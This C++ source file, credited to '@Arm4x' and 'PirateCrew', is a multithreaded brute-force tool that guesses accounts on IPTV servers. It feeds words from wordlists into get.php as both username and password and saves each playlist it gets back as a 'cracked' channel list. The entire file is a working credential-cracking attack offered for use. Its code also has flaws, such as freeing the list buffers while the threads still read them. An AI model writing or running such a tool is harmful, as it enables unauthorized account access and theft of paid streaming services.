// Code by @Arm4x
//
// (c) PirateCrew

#include <iostream>
#include <string>
#include <curl/curl.h>
#include <fstream>
#include <cstdlib>
#include <thread>
#include <assert.h>

#define NUM_THREADS     17

using namespace std;

static size_t WriteCallback(void *contents, size_t size, size_t nmemb, void *userp) {
    ((string*)userp)->append((char*)contents, size * nmemb);
    return size * nmemb;
}

struct thread_argument {
    int  thread_id;
    char *server;
    char *list;
};


void *attack(void *args) {
    struct thread_argument *params;
    params = (struct thread_argument *) args;
    int thread_id = params->thread_id;
    string server = params->server;
    string list = params->list;
    string line;
    ifstream infile(list);
    
    while(getline(infile, line)) {
        CURL *curl;
        CURLcode res;
        string readBuffer;
        string filename;
        string url;
        
        curl = curl_easy_init();
        if(curl) {
            url = string(server)+"/get.php?username="+line+"&password="+line+"&type=m3u&output=mpegts";
            filename = string("output/tv_channels_")+line+".m3u";
            curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
            curl_easy_setopt(curl, CURLOPT_WRITEDATA, &readBuffer);
            res = curl_easy_perform(curl);
            
            if(readBuffer.size()>0) {
                cout << "[+] thread-" << thread_id << " account found!";
                ofstream out(filename);
                out << readBuffer;
                out.close();
            }
            curl_easy_cleanup(curl);
        }
    }
    pthread_exit(NULL);
}

int main() {
    string server;
    pthread_t threads[NUM_THREADS];
    struct thread_argument td[NUM_THREADS];
    int th;
    int i;
    const string lists[17] = {"part_list/a.txt","part_list/b.txt","part_list/c.txt","part_list/d.txt","part_list/e.txt","part_list/f.txt","part_list/g.txt","part_list/i.txt","part_list/l.txt","part_list/m.txt","part_list/n.txt","part_list/o.txt","part_list/p.txt","part_list/r.txt","part_list/s.txt","part_list/u.txt","part_list/z.txt"};
    
    
    
    cout << "-- iptv extreme --" << endl;
    cout << "coded by: @Arm4x" << endl;
    cout << "server url: ";
    cin >> server;
    char *serverstr = new char[server.length() + 1];
    strcpy(serverstr, server.c_str());
    cout << endl;
    
    cout << "[i] Starting threads..." << endl;
    
    for( i=0; i < NUM_THREADS; i++ ){
        cout <<"Starting thread: " << i << endl;
        
        char *liststr = new char[lists[i].length() + 1];
        strcpy(liststr, lists[i].c_str());
        
        td[i].thread_id = i;
        td[i].server = serverstr;
        td[i].list = liststr;
        
        th = pthread_create(&threads[i], NULL, attack, (void *)&td[i]);
        if (th){
            cout << "[!] Error: unable to create thread" << td << endl;
            exit(-1);
        }
        delete [] liststr;
    }
    
    cout << "[i] no output is showed for faster cracking, just wait until exit" << endl;
    cout << "[i] you will see cracked channel in the output directory" << endl;
    
    for (i=0; i<NUM_THREADS; ++i) {
        th = pthread_join(threads[i], NULL);
        assert(0 == th);
    }
  
    delete [] serverstr;
    
    return 0;
}